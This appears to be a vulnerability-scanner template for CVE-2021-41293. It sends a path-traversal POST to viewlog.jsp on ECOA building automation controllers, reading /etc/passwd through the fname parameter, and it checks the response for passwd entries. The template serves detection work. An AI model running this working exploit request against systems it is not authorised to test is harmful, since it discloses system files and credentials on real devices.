http:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /viewlog.jsp HTTP/1.1

    Host: {{Hostname}}


    yr=2021&mh=6&fname=../../../../../../../../etc/passwd

    '
id: CVE-2021-41293
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:o:ecoa:ecs_router_controller-ecs_firmware:-:*:*:*:*:*:*:*
    cve-id: CVE-2021-41293
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99535
    epss-score: 0.89647
  description: The ECOA BAS controller suffers from an arbitrary file disclosure vulnerability.
    Using the 'fname' POST parameter in viewlog.jsp, attackers can disclose arbitrary
    files on the affected device and disclose sensitive and system information.
  impact: 'Unauthenticated attackers can read arbitrary files from the ECOA BAS controller
    including /etc/passwd via path traversal in the fname parameter, potentially exposing
    sensitive system configuration and credentials.

    '
  metadata:
    max-request: 1
    product: ecs_router_controller-ecs_firmware
    vendor: ecoa
  name: ECOA Building Automation System - Arbitrary File Retrieval
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41293
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5679.php
  - https://www.twcert.org.tw/tw/cp-132-5129-7e623-1.html
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix the arbitrary file retrieval vulnerability in the ECOA Building Automation
    System.

    '
  severity: high
  tags: cve2021,cve,ecoa,lfi,disclosure,vkev,vuln
